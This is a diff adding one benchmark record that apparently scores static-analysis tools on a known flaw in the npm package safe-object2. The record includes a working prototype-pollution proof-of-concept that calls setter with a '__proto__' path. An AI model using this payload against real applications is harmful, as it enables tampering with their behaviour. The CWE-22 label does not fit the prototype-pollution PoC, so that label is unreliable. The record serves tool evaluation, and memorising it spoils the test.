@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": 1335,
+        "cwe": "CWE-22"
+    },
+    "correct_cwe": "CWE-22",
+    "correct_package_link": "https://registry.npmjs.org/safe-object2/-/safe-object2-1.0.3.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 32,
+                    "code": "safeObject2.prototype.setter = function(paths, value) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 53,
+                    "code": "init[acc] = curValue;"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "const safeObj2 = require(\"safe-object2\");\nconst obj = safeObj2({});\nobj.setter(['__proto__', 'polluted'], true)\nconsole.log(polluted);"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/jiameng123/safe-object/pull/1/commits/9d07fe95d103578553c3889f7296148d9d665477"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "D"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "D"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "B"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "D"
+        }
+    }
+}
